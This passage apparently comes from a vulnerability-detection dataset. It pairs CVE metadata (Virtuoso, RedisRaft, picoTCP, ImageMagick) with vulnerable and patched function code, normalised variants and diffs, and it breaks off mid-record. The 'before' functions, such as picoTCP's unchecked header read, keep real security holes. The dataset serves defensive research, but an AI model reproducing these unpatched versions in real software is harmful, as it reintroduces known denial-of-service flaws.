}",openlink/virtuoso-opensource/311097fb1f23d0a1dd7dcdd2afecf6fe14665526/sqlview.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -16,6 +16,10 @@
   /*dk_free_tree ((caddr_t) tree->_.insert.table);*/
   tree->_.insert.table = (ST *) t_box_copy_tree (
       (caddr_t) view->_.select_stmt.table_exp->_.table_exp.from[0]->_.table_ref.table);
+
+  if (BOX_ELEMENTS_0(cols) != BOX_ELEMENTS_0(tree->_.insert.vals->_.ins_vals.vals))
+    sqlc_new_error (sc->sc_cc, ""21S01"", ""SQ099"",
+	""different number of cols and values in insert."");
 
   _DO_BOX (inx, tree->_.insert.cols)
     {","{'deleted_lines': [], 'added_lines': ['', '  if (BOX_ELEMENTS_0(cols) != BOX_ELEMENTS_0(tree->_.insert.vals->_.ins_vals.vals))', '    sqlc_new_error (sc->sc_cc, ""21S01"", ""SQ099"",', '\t""different number of cols and values in insert."");']}",True,An issue in the sinv_check_exp component of openlink virtuoso-opensource v7.2.9 allows attackers to cause a Denial of Service (DoS) via crafted SQL statements.,7.5,HIGH,2,valid,2023-04-13T13:11:17Z,4
CVE-2023-31655,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,RedisLabs/redisraft,Better redis version check,1df932be8dc5301d63d73121dd0fdf8beee40b02,https://github.com/RedisLabs/redisraft/commit/1df932be8dc5301d63d73121dd0fdf8beee40b02,src/redisraft.c,RedisModule_OnLoad,"__attribute__((__unused__)) int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
int ret;
ret = RedisModule_Init(ctx, ""raft"", 1, REDISMODULE_APIVER_1);
if (ret != REDISMODULE_OK) {
return REDISMODULE_ERR;
}
RedisModule_Log(ctx, REDISMODULE_LOGLEVEL_NOTICE,
""RedisRaft version %s [%s]"",
REDISRAFT_VERSION, REDISRAFT_GIT_SHA1);
const int MIN_SUPPORTED_REDIS_VERSION = 0x00070000;
if (!RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||
RedisModule_GetServerVersion() < MIN_SUPPORTED_REDIS_VERSION) {
RedisModule_Log(ctx, REDISMODULE_LOGLEVEL_WARNING,
""RedisRaft requires Redis 7.0 or above"");
return REDISMODULE_ERR;
}
redisraft_log_ctx = RedisModule_GetDetachedThreadSafeContext(ctx);
RedisModule_RegisterInfoFunc(ctx, handleInfo);
RedisModule_RegisterCommandFilter(ctx, interceptRedisCommands, 0);
if (registerRaftCommands(ctx) == RR_ERROR) {
LOG_WARNING(""Failed to register commands"");
goto error;
}
ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_ClientChange,
handleClientEvent);
if (ret != REDISMODULE_OK) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_EventLoop,
beforeSleep);
if (ret != REDISMODULE_OK) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_Config,
ConfigRedisEventCallback);
if (ret != REDISMODULE_OK) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
if (RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_ModuleChange,
moduleChangeCallback) != REDISMODULE_OK) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
RedisRaftCtx *rr = &redis_raft;
if (RedisRaftCtxInit(rr, ctx) == RR_ERROR) {
LOG_WARNING(""Failed to init redis raft context"");
goto error;
}
LOG_NOTICE(""Raft module loaded, state is '%s'"", getStateStr(rr));
return REDISMODULE_OK;
error:
RedisRaftFreeGlobals();
return REDISMODULE_ERR;
}","__attribute__((VAR_0)) int RedisModule_OnLoad(RedisModuleCtx *VAR_1, RedisModuleString **VAR_2, int VAR_3)
{
int VAR_4;
VAR_4 = RedisModule_Init(VAR_1, ""raft"", 1, VAR_5);
if (VAR_4 != VAR_6) {
return VAR_7;
}
RedisModule_Log(VAR_1, VAR_8,
""RedisRaft version %s [%s]"",
VAR_9, VAR_10);
const int VAR_11 = 0x00070000;
if (!RMAPI_FUNC_SUPPORTED(VAR_12) ||
VAR_12() < VAR_11) {
RedisModule_Log(VAR_1, VAR_13,
""RedisRaft requires Redis 7.0 or above"");
return VAR_7;
}
VAR_14 = RedisModule_GetDetachedThreadSafeContext(VAR_1);
RedisModule_RegisterInfoFunc(VAR_1, VAR_15);
RedisModule_RegisterCommandFilter(VAR_1, VAR_16, 0);
if (registerRaftCommands(VAR_1) == VAR_17) {
LOG_WARNING(""Failed to register commands"");
goto error;
}
VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_18,
VAR_19);
if (VAR_4 != VAR_6) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_20,
VAR_21);
if (VAR_4 != VAR_6) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_22,
VAR_23);
if (VAR_4 != VAR_6) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
if (RedisModule_SubscribeToServerEvent(VAR_1, VAR_24,
VAR_25) != VAR_6) {
LOG_WARNING(""Failed to subscribe to server events."");
goto error;
}
RedisRaftCtx *VAR_26 = &VAR_27;
if (RedisRaftCtxInit(VAR_26, VAR_1) == VAR_17) {
LOG_WARNING(""Failed to init redis raft context"");
goto error;
}
LOG_NOTICE(""Raft module loaded, state is '%s'"", getStateStr(VAR_26));
return VAR_6;
error:
RedisRaftFreeGlobals();
return VAR_7;
}",RedisLabs/redisraft/1df932be8dc5301d63d73121dd0fdf8beee40b02/redisraft.c/vul/before/0.json,"__attribute__((__unused__)) int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    int ret;

    ret = RedisModule_Init(ctx, ""raft"", 1, REDISMODULE_APIVER_1);
    if (ret != REDISMODULE_OK) {
        return REDISMODULE_ERR;
    }

    RedisModule_Log(ctx, REDISMODULE_LOGLEVEL_NOTICE,
                    ""RedisRaft version %s [%s]"",
                    REDISRAFT_VERSION, REDISRAFT_GIT_SHA1);

    const int MIN_SUPPORTED_REDIS_VERSION = 0x00070000;
    if (!RMAPI_FUNC_SUPPORTED(RedisModule_CallReplyPromiseAbort) ||
        !RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||
        RedisModule_GetServerVersion() < MIN_SUPPORTED_REDIS_VERSION) {
        RedisModule_Log(ctx, REDISMODULE_LOGLEVEL_WARNING,
                        ""RedisRaft requires Redis build from 'unstable' branch"");
        return REDISMODULE_ERR;
    }

    /* Create a logging context */
    redisraft_log_ctx = RedisModule_GetDetachedThreadSafeContext(ctx);

    RedisModule_RegisterInfoFunc(ctx, handleInfo);
    RedisModule_RegisterCommandFilter(ctx, interceptRedisCommands, 0);

    if (registerRaftCommands(ctx) == RR_ERROR) {
        LOG_WARNING(""Failed to register commands"");
        goto error;
    }

    ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_ClientChange,
                                             handleClientEvent);
    if (ret != REDISMODULE_OK) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_EventLoop,
                                             beforeSleep);
    if (ret != REDISMODULE_OK) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    ret = RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_Config,
                                             ConfigRedisEventCallback);
    if (ret != REDISMODULE_OK) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    if (RedisModule_SubscribeToServerEvent(ctx, RedisModuleEvent_ModuleChange,
                                           moduleChangeCallback) != REDISMODULE_OK) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    RedisRaftCtx *rr = &redis_raft;

    if (RedisRaftCtxInit(rr, ctx) == RR_ERROR) {
        LOG_WARNING(""Failed to init redis raft context"");
        goto error;
    }

    LOG_NOTICE(""Raft module loaded, state is '%s'"", getStateStr(rr));
    return REDISMODULE_OK;
error:
    RedisRaftFreeGlobals();
    return REDISMODULE_ERR;
}","__attribute__((VAR_0)) int RedisModule_OnLoad(RedisModuleCtx *VAR_1, RedisModuleString **VAR_2, int VAR_3)
{
    int VAR_4;

    VAR_4 = RedisModule_Init(VAR_1, ""raft"", 1, VAR_5);
    if (VAR_4 != VAR_6) {
        return VAR_7;
    }

    RedisModule_Log(VAR_1, VAR_8,
                    ""RedisRaft version %s [%s]"",
                    VAR_9, VAR_10);

    const int VAR_11 = 0x00070000;
    if (!RMAPI_FUNC_SUPPORTED(VAR_12) ||
        !RMAPI_FUNC_SUPPORTED(VAR_13) ||
        VAR_13() < VAR_11) {
        RedisModule_Log(VAR_1, VAR_14,
                        ""RedisRaft requires Redis build from 'unstable' branch"");
        return VAR_7;
    }

    /* COMMENT_0 */
    VAR_15 = RedisModule_GetDetachedThreadSafeContext(VAR_1);

    RedisModule_RegisterInfoFunc(VAR_1, VAR_16);
    RedisModule_RegisterCommandFilter(VAR_1, VAR_17, 0);

    if (registerRaftCommands(VAR_1) == VAR_18) {
        LOG_WARNING(""Failed to register commands"");
        goto error;
    }

    VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_19,
                                             VAR_20);
    if (VAR_4 != VAR_6) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_21,
                                             VAR_22);
    if (VAR_4 != VAR_6) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    VAR_4 = RedisModule_SubscribeToServerEvent(VAR_1, VAR_23,
                                             VAR_24);
    if (VAR_4 != VAR_6) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    if (RedisModule_SubscribeToServerEvent(VAR_1, VAR_25,
                                           VAR_26) != VAR_6) {
        LOG_WARNING(""Failed to subscribe to server events."");
        goto error;
    }

    RedisRaftCtx *VAR_27 = &VAR_28;

    if (RedisRaftCtxInit(VAR_27, VAR_1) == VAR_18) {
        LOG_WARNING(""Failed to init redis raft context"");
        goto error;
    }

    LOG_NOTICE(""Raft module loaded, state is '%s'"", getStateStr(VAR_27));
    return VAR_6;
error:
    RedisRaftFreeGlobals();
    return VAR_7;
}",RedisLabs/redisraft/1df932be8dc5301d63d73121dd0fdf8beee40b02/redisraft.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -12,10 +12,11 @@
                     REDISRAFT_VERSION, REDISRAFT_GIT_SHA1);
 
     const int MIN_SUPPORTED_REDIS_VERSION = 0x00070000;
-    if (!RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||
+    if (!RMAPI_FUNC_SUPPORTED(RedisModule_CallReplyPromiseAbort) ||
+        !RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||
         RedisModule_GetServerVersion() < MIN_SUPPORTED_REDIS_VERSION) {
         RedisModule_Log(ctx, REDISMODULE_LOGLEVEL_WARNING,
-                        ""RedisRaft requires Redis 7.0 or above"");
+                        ""RedisRaft requires Redis build from 'unstable' branch"");
         return REDISMODULE_ERR;
     }
 ","{'deleted_lines': ['    if (!RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||', '                        ""RedisRaft requires Redis 7.0 or above"");'], 'added_lines': ['    if (!RMAPI_FUNC_SUPPORTED(RedisModule_CallReplyPromiseAbort) ||', '        !RMAPI_FUNC_SUPPORTED(RedisModule_GetServerVersion) ||', '                        ""RedisRaft requires Redis build from \'unstable\' branch"");']}",True,redis v7.0.10 was discovered to contain a segmentation violation. This vulnerability allows attackers to cause a Denial of Service (DoS) via unspecified vectors.,7.5,HIGH,2,valid,2023-04-13T14:29:23Z,4
CVE-2023-35846,"['CWE-Other', 'CWE-682']",CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,virtualsquare/picotcp,"[ipfilter] Check transport layer length in frame before filtering ports

Reported-by: ""P. Amsuo, Purdue University""",d561990a358899178115e156871cc054a1c55ffe,https://github.com/virtualsquare/picotcp/commit/d561990a358899178115e156871cc054a1c55ffe,modules/pico_ipfilter.c,ipfilter,"int ipfilter(struct pico_frame *f)
{
struct filter_node temp;
struct pico_ipv4_hdr *ipv4_hdr = (struct pico_ipv4_hdr *) f->net_hdr;
struct pico_trans *trans;
struct pico_icmp4_hdr *icmp_hdr;
memset(&temp, 0u, sizeof(struct filter_node));
temp.fdev = f->dev;
temp.out_addr = ipv4_hdr->dst.addr;
temp.in_addr = ipv4_hdr->src.addr;
if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {
trans = (struct pico_trans *) f->transport_hdr;
temp.out_port = short_be(trans->dport);
temp.in_port = short_be(trans->sport);
}
else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {
icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;
if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)
return 0;
}
temp.proto = ipv4_hdr->proto;
temp.priority = f->priority;
temp.tos = ipv4_hdr->tos;
return ipfilter_apply_filter(f, &temp);
}","int ipfilter(struct pico_frame *VAR_0)
{
struct filter_node VAR_1;
struct pico_ipv4_hdr *VAR_2 = (struct pico_ipv4_hdr *) VAR_0->net_hdr;
struct pico_trans *VAR_3;
struct pico_icmp4_hdr *VAR_4;
memset(&VAR_1, 0u, sizeof(struct filter_node));
VAR_1.fdev = VAR_0->dev;
VAR_1.out_addr = VAR_2->dst.addr;
VAR_1.in_addr = VAR_2->src.addr;
if ((VAR_2->proto == VAR_5) || (VAR_2->proto == VAR_6)) {
VAR_3 = (struct pico_trans *) VAR_0->transport_hdr;
VAR_1.out_port = short_be(VAR_3->dport);
VAR_1.in_port = short_be(VAR_3->sport);
}
else if(VAR_2->proto == VAR_7) {
VAR_4 = (struct pico_icmp4_hdr *) VAR_0->transport_hdr;
if(VAR_4->type == VAR_8 && VAR_4->code == VAR_9)
return 0;
}
VAR_1.proto = VAR_2->proto;
VAR_1.priority = VAR_0->priority;
VAR_1.tos = VAR_2->tos;
return ipfilter_apply_filter(VAR_0, &VAR_1);
}",virtualsquare/picotcp/d561990a358899178115e156871cc054a1c55ffe/pico_ipfilter.c/vul/before/0.json,"int ipfilter(struct pico_frame *f)
{
    struct filter_node temp;
    struct pico_ipv4_hdr *ipv4_hdr = (struct pico_ipv4_hdr *) f->net_hdr;
    struct pico_trans *trans;
    struct pico_icmp4_hdr *icmp_hdr;

    memset(&temp, 0u, sizeof(struct filter_node));

    temp.fdev = f->dev;
    temp.out_addr = ipv4_hdr->dst.addr;
    temp.in_addr = ipv4_hdr->src.addr;
    if ((f->transport_hdr + sizeof(struct pico_trans)) <= (f->buffer + f->buffer_len)) {
        if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {
                trans = (struct pico_trans *) f->transport_hdr;
                temp.out_port = short_be(trans->dport);
                temp.in_port = short_be(trans->sport);
        } else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {
            icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;
            if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)
                return 0;
        }
        temp.proto = ipv4_hdr->proto;
    }
    temp.priority = f->priority;
    temp.tos = ipv4_hdr->tos;
    return ipfilter_apply_filter(f, &temp);
}","int ipfilter(struct pico_frame *VAR_0)
{
    struct filter_node VAR_1;
    struct pico_ipv4_hdr *VAR_2 = (struct pico_ipv4_hdr *) VAR_0->net_hdr;
    struct pico_trans *VAR_3;
    struct pico_icmp4_hdr *VAR_4;

    memset(&VAR_1, 0u, sizeof(struct filter_node));

    VAR_1.fdev = VAR_0->dev;
    VAR_1.out_addr = VAR_2->dst.addr;
    VAR_1.in_addr = VAR_2->src.addr;
    if ((VAR_0->transport_hdr + sizeof(struct pico_trans)) <= (VAR_0->buffer + VAR_0->buffer_len)) {
        if ((VAR_2->proto == VAR_5) || (VAR_2->proto == VAR_6)) {
                VAR_3 = (struct pico_trans *) VAR_0->transport_hdr;
                VAR_1.out_port = short_be(VAR_3->dport);
                VAR_1.in_port = short_be(VAR_3->sport);
        } else if(VAR_2->proto == VAR_7) {
            VAR_4 = (struct pico_icmp4_hdr *) VAR_0->transport_hdr;
            if(VAR_4->type == VAR_8 && VAR_4->code == VAR_9)
                return 0;
        }
        VAR_1.proto = VAR_2->proto;
    }
    VAR_1.priority = VAR_0->priority;
    VAR_1.tos = VAR_2->tos;
    return ipfilter_apply_filter(VAR_0, &VAR_1);
}",virtualsquare/picotcp/d561990a358899178115e156871cc054a1c55ffe/pico_ipfilter.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,18 +10,18 @@
     temp.fdev = f->dev;
     temp.out_addr = ipv4_hdr->dst.addr;
     temp.in_addr = ipv4_hdr->src.addr;
-    if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {
-        trans = (struct pico_trans *) f->transport_hdr;
-        temp.out_port = short_be(trans->dport);
-        temp.in_port = short_be(trans->sport);
+    if ((f->transport_hdr + sizeof(struct pico_trans)) <= (f->buffer + f->buffer_len)) {
+        if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {
+                trans = (struct pico_trans *) f->transport_hdr;
+                temp.out_port = short_be(trans->dport);
+                temp.in_port = short_be(trans->sport);
+        } else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {
+            icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;
+            if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)
+                return 0;
+        }
+        temp.proto = ipv4_hdr->proto;
     }
-    else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {
-        icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;
-        if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)
-            return 0;
-    }
-
-    temp.proto = ipv4_hdr->proto;
     temp.priority = f->priority;
     temp.tos = ipv4_hdr->tos;
     return ipfilter_apply_filter(f, &temp);","{'deleted_lines': ['    if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {', '        trans = (struct pico_trans *) f->transport_hdr;', '        temp.out_port = short_be(trans->dport);', '        temp.in_port = short_be(trans->sport);', '    else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {', '        icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;', '        if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)', '            return 0;', '    }', '', '    temp.proto = ipv4_hdr->proto;'], 'added_lines': ['    if ((f->transport_hdr + sizeof(struct pico_trans)) <= (f->buffer + f->buffer_len)) {', '        if ((ipv4_hdr->proto == PICO_PROTO_TCP) || (ipv4_hdr->proto == PICO_PROTO_UDP)) {', '                trans = (struct pico_trans *) f->transport_hdr;', '                temp.out_port = short_be(trans->dport);', '                temp.in_port = short_be(trans->sport);', '        } else if(ipv4_hdr->proto == PICO_PROTO_ICMP4) {', '            icmp_hdr = (struct pico_icmp4_hdr *) f->transport_hdr;', '            if(icmp_hdr->type == PICO_ICMP_UNREACH && icmp_hdr->code == PICO_ICMP_UNREACH_FILTER_PROHIB)', '                return 0;', '        }', '        temp.proto = ipv4_hdr->proto;']}",True,VirtualSquare picoTCP (aka PicoTCP-NG) through 2.1 does not check the transport layer length in a frame before performing port filtering.,7.5,HIGH,2,valid,2023-05-12T20:24:23Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,coders/pcl.c,ReadPCLImage,"static Image *ReadPCLImage(const ImageInfo *image_info,ExceptionInfo *exception)
{
#define CropBox  ""CropBox""
#define DeviceCMYK  ""DeviceCMYK""
#define MediaBox  ""MediaBox""
#define RenderPCLText  ""  Rendering PCL...  ""
char
command[MagickPathExtent],
*density,
filename[MagickPathExtent],
geometry[MagickPathExtent],
*options,
input_filename[MagickPathExtent];
const DelegateInfo
*delegate_info;
Image
*image,
*next_image;
ImageInfo
*read_info;
MagickBooleanType
cmyk,
status;
PointInfo
delta;
RectangleInfo
bounding_box,
page;
char
*p;
ssize_t
c;
SegmentInfo
bounds;
size_t
height,
width;
ssize_t
count;
assert(image_info != (const ImageInfo *) NULL);
assert(image_info->signature == MagickCoreSignature);
assert(exception != (ExceptionInfo *) NULL);
assert(exception->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
image_info->filename);
image=AcquireImage(image_info,exception);
status=OpenBlob(image_info,image,ReadBinaryBlobMode,exception);
if (status == MagickFalse)
{
image=DestroyImageList(image);
return((Image *) NULL);
}
status=AcquireUniqueSymbolicLink(image_info->filename,input_filename);
if (status == MagickFalse)
{
ThrowFileException(exception,FileOpenError,""UnableToCreateTemporaryFile"",
image_info->filename);
image=DestroyImageList(image);
return((Image *) NULL);
}
delta.x=DefaultResolution;
delta.y=DefaultResolution;
if ((image->resolution.x == 0.0) || (image->resolution.y == 0.0))
{
GeometryInfo
geometry_info;
MagickStatusType
flags;
flags=ParseGeometry(PSDensityGeometry,&geometry_info);
if ((flags & RhoValue) != 0)
image->resolution.x=geometry_info.rho;
image->resolution.y=image->resolution.x;
if ((flags & SigmaValue) != 0)
image->resolution.y=geometry_info.sigma;
}
cmyk=image->colorspace == CMYKColorspace ? MagickTrue : MagickFalse;
count=0;
(void) memset(&bounding_box,0,sizeof(bounding_box));
(void) memset(&bounds,0,sizeof(bounds));
(void) memset(&page,0,sizeof(page));
(void) memset(command,0,sizeof(command));
p=command;
for (c=ReadBlobByte(image); c != EOF; c=ReadBlobByte(image))
{
if (image_info->page != (char *) NULL)
continue;
*p++=(char) c;
if ((c != (int) '/') && (c != '\n') &&
((size_t) (p-command) < (MagickPathExtent-1)))
continue;
*p='\0';
p=command;
if (LocaleNCompare(DeviceCMYK,command,strlen(DeviceCMYK)) == 0)
cmyk=MagickTrue;
if (LocaleNCompare(CropBox,command,strlen(CropBox)) == 0)
{
count=(ssize_t) sscanf(command,""CropBox [%lf %lf %lf %lf"",
&bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
if (count != 4)
count=(ssize_t) sscanf(command,""CropBox[%lf %lf %lf %lf"",
&bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
}
if (LocaleNCompare(MediaBox,command,strlen(MediaBox)) == 0)
{
count=(ssize_t) sscanf(command,""MediaBox [%lf %lf %lf %lf"",
&bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
if (count != 4)
count=(ssize_t) sscanf(command,""MediaBox[%lf %lf %lf %lf"",
&bounds.x1,&bounds.y1,&bounds.x2,&bounds.y2);
}
if (count != 4)
continue;
width=(size_t)CastDoubleToLong(floor(bounds.x2-bounds.x1+0.5));
height=(size_t)CastDoubleToLong(floor(bounds.y2-bounds.y1+0.5));
if (width > page.width)
page.width=width;
if (height > page.height)
page.height=height;
}
(void) CloseBlob(image);
if ((page.width == 0) || (page.height == 0))
(void) ParseAbsoluteGeometry(PSPageGeometry,&page);
if (image_info->page != (char *) NULL)
(void) ParseAbsoluteGeometry(image_info->page,&page);
(void) FormatLocaleString(geometry,MagickPathExtent,""%.20gx%.20g"",(double)
page.width,(double) page.height);
if (image_info->monochrome != MagickFalse)
delegate_info=GetDelegateInfo(""pcl:mono"",(char *) NULL,exception);
else
if (cmyk != MagickFalse)
delegate_info=GetDelegateInfo(""pcl:cmyk"",(char *) NULL,exception);
else
delegate_info=GetDelegateInfo(""pcl:color"",(char *) NULL,exception);
if (delegate_info == (const DelegateInfo *) NULL)
{
image=DestroyImage(image);
return((Image *) NULL);
}
if ((page.width == 0) || (page.height == 0))
(void) ParseAbsoluteGeometry(PSPageGeometry,&page);
if (image_info->page != (char *) NULL)
(void) ParseAbsoluteGeometry(image_info->page,&page);
density=AcquireString("""");
options=AcquireString("""");
(void) FormatLocaleString(density,MagickPathExtent,""%gx%g"",
image->resolution.x,image->resolution.y);
if (image_info->ping != MagickFalse)
(void) FormatLocaleString(density,MagickPathExtent,""2.0x2.0"");
page.width=(size_t) floor(page.width*image->resolution.x/delta.x+0.5);
page.height=(size_t) floor(page.height*image->resolution.y/delta.y+0.5);
(void) FormatLocaleString(options,MagickPathExtent,""-g%.20gx%.20g "",(double)
page.width,(double) page.height);
image=DestroyImage(image);
read_info=CloneImageInfo(image_info);
*read_info->magick='\0';
if (read_info->number_scenes != 0)
{
if (read_info->number_scenes != 1)
(void) FormatLocaleString(options,MagickPathExtent,""-dLastPage=%.20g"",
(double) (read_info->scene+read_info->number_scenes));
else
(void) FormatLocaleString(options,MagickPathExtent,
""-dFirstPage=%.20g -dLastPage=%.20g"",(double) read_info->scene+1,
(double) (read_info->scene+read_info->number_scenes));
read_info->number_scenes=0;
if (read_info->scenes != (char *) NULL)
*read_info->scenes='\0';
}
(void) CopyMagickString(filename,read_info->filename,MagickPathExtent);
(void) AcquireUniqueFilename(read_info->filename);
(void) FormatLocaleString(command,MagickPathExtent,
GetDelegateCommands(delegate_info),
read_info->antialias != MagickFalse ? 4 : 1,
read_info->antialias != MagickFalse ? 4 : 1,density,options,
read_info->filename,input_filename);
options=DestroyString(options);
density=DestroyString(density);
status=ExternalDelegateCommand(MagickFalse,read_info->verbose,command,
(char *) NULL,exception) != 0 ? MagickTrue : MagickFalse;
image=ReadImage(read_info,exception);
(void) RelinquishUniqueFileResource(read_info->filename);
(void) RelinquishUniqueFileResource(input_filename);
read_info=DestroyImageInfo(read_info);
if (image == (Image *) NULL)
ThrowReaderException(DelegateError,""PCLDelegateFailed"");
if (LocaleCompare(image->magick,""BMP"") == 0)
{
Image
*cmyk_image;
cmyk_image=ConsolidateCMYKImages(image,exception);
if (cmyk_image != (Image *) NULL)
{
image=DestroyImageList(image);
image=cmyk_image;
}
}
do
{
(void) CopyMagickString(image->filename,filename,MagickPathExtent);
image->page=page;
if (image_info->ping != MagickFalse)
{
image->magick_columns*=image->resolution.x/2.0;
image->magick_rows*=image->resolution.y/2.0;
image->columns*=image->resolution.x/2.0;
image->rows*=image->resolution.y/2.0;
}
next_image=SyncNextImageInList(image);
if (next_image != (Image *) NULL)
image=next_image;
} while (next_image != (Image *) NULL);
return(GetFirstImageInList(image));
}","static Image *ReadPCLImage(const ImageInfo *VAR_0,ExceptionInfo *VAR_1)
{
#define VAR_2  ""CropBox""
#define VAR_3  ""DeviceCMYK""
#define VAR_4  ""MediaBox""
#define VAR_5  ""  Rendering PCL...  ""
char
VAR_6[VAR_7],
*VAR_8,
VAR_9[VAR_7],
VAR_10[VAR_7],
*VAR_11,
VAR_12[VAR_7];
const DelegateInfo
*VAR_13;
Image
*VAR_14,
*VAR_15;
ImageInfo
*VAR_16;
MagickBooleanType
VAR_17,
VAR_18;
PointInfo
VAR_19;
RectangleInfo
VAR_20,
VAR_21;
char
*VAR_22;
ssize_t
VAR_23;
SegmentInfo
VAR_24;
size_t
VAR_25,
VAR_26;
ssize_t
VAR_27;
assert(VAR_0 != (const ImageInfo *) NULL);
assert(VAR_0->signature == VAR_28);
assert(VAR_1 != (ExceptionInfo *) NULL);
assert(VAR_1->signature == VAR_28);
if (IsEventLogging() != VAR_29)
(void) LogMagickEvent(VAR_30,GetMagickModule(),""%s"",
VAR_0->filename);
VAR_14=AcquireImage(VAR_0,VAR_1);
VAR_18=OpenBlob(VAR_0,VAR_14,VAR_31,VAR_1);
if (VAR_18 == VAR_29)
{
VAR_14=DestroyImageList(VAR_14);
return((Image *) NULL);
}
VAR_18=AcquireUniqueSymbolicLink(VAR_0->filename,VAR_12);
if (VAR_18 == VAR_29)
{
ThrowFileException(VAR_1,VAR_32,""UnableToCreateTemporaryFile"",
VAR_0->filename);
VAR_14=DestroyImageList(VAR_14);
return((Image *) NULL);
}
VAR_19.x=VAR_33;
VAR_19.y=VAR_33;
if ((VAR_14->resolution.x == 0.0) || (VAR_14->resolution.y == 0.0))
{
GeometryInfo
VAR_34;
MagickStatusType
VAR_35;
VAR_35=ParseGeometry(VAR_36,&VAR_34);
if ((VAR_35 & VAR_37) != 0)
VAR_14->resolution.x=VAR_34.rho;
VAR_14->resolution.y=VAR_14->resolution.x;
if ((VAR_35 & VAR_38) != 0)
VAR_14->resolution.y=VAR_34.sigma;
}
VAR_17=VAR_14->colorspace == VAR_39 ? VAR_40 : VAR_29;
VAR_27=0;
(void) memset(&VAR_20,0,sizeof(VAR_20));
(void) memset(&VAR_24,0,sizeof(VAR_24));
(void) memset(&VAR_21,0,sizeof(VAR_21));
(void) memset(VAR_6,0,sizeof(VAR_6));
VAR_22=VAR_6;
for (VAR_23=ReadBlobByte(VAR_14); VAR_23 != VAR_41; VAR_23=ReadBlobByte(VAR_14))
{
if (VAR_0->page != (char *) NULL)
continue;
*VAR_22++=(char) VAR_23;
if ((VAR_23 != (int) '/') && (VAR_23 != '\n') &&
